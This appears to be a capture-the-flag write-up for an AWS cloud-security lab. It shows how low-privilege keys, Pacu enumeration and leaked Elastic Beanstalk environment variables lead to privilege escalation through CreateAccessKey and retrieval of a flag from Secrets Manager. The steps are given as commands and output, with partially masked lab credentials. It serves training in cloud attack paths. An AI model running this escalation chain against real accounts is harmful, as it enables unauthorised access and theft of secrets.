# Initial Access

### Credentials

```bash
initial_low_priv_credentials = Access Key: AKIAUR.......
Secret Key: /ocpu1....
```
### Enumeration
```bash
aws sts get-caller-identity --profile beanstalk
{
    "UserId": "AIDAURY6ZIC4OOO6J5V35",
    "Account": "313060311224",
    "Arn": "arn:aws:iam::313060311224:user/cgide9uo5os4u0_low_priv_user"
}
```
```bash
Pacu (beanstalk:imported-beanstalk) > whoami
{
  "UserName": "cgide9uo5os4u0_low_priv_user",
  "RoleName": null,
  "Arn": "arn:aws:iam::313060311224:user/cgide9uo5os4u0_low_priv_user",
  "AccountId": "313060311224",
  "UserId": "AIDAURY6ZIC4OOO6J5V35",
  "Roles": null,
  "Groups": [],
  "Policies": [],
  "AccessKeyId": "AKIAURY6ZIC4FKWDNDEO",
  "SecretAccessKey": "/ocpu1vt8gnsMHaCdGn8********************",
  "SessionToken": null,
  "KeyAlias": "imported-beanstalk",
  "PermissionsConfirmed": false,
  "Permissions": {
    "Allow": {},
    "Deny": {}
  }
}
```
- note beanstalk

After researching beanstalk I found this link:

https://rhinosecuritylabs.com/tools/new-pacu-module-enumerating-elastic-beanstalk/

Ran pacu, imported keys, and ran the elasticbeanstalk__enum module and found:

```bash
"Secrets": [
        {
            "OptionName": "SSHSourceRestriction",
            "Value": "tcp,22,22,0.0.0.0/0"
        },
        {
            "OptionName": "EnvironmentVariables",
            "Value": "SECONDARY_SECRET_KEY=uPt0xO9g.....,PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=AK....."
        },
        {
            "OptionName": "SECONDARY_ACCESS_KEY",
            "Value": "AKIAURY....."
        }
    ],
```
### Enumeration 2nd Profile
From there, I configured a new aws profile with the given access key and secret access key and verified my profile

```bash
aws sts get-caller-identity --profile secretbeans
{
    "UserId": "AIDAURY6ZIC4BGVSF5PN5",
    "Account": "313060311224",
    "Arn": "arn:aws:iam::313060311224:user/cgide9uo5os4u0_secondary_user"
}
```
I used pacu and ran the iam__enum_permissions module and used whoami to display permissions

```bash
Permissions": {
    "Allow": [
      "iam:GetUser",
      "iam:ListAttachedUserPolicies",
      "dynamodb:DescribeEndpoints",
      "sts:GetSessionToken",
      "sts:GetCallerIdentity",
      "iam:ListPolicies",
      "iam:ListRoles",
      "iam:GetUser",
      "iam:ListUsers",
      "iam:ListGroups"
    ],
```
### Privesc 2nd Profile

From there I ran ```run iam__privesc_scan --scan-only``` on pacu and it revealed we can privilege escalate through CreateAccessKey

I then ran
```
run iam__privesc_scan --user-methods CreateAccessKey
```
and navigated to the secrets manager to retrive the flag






  
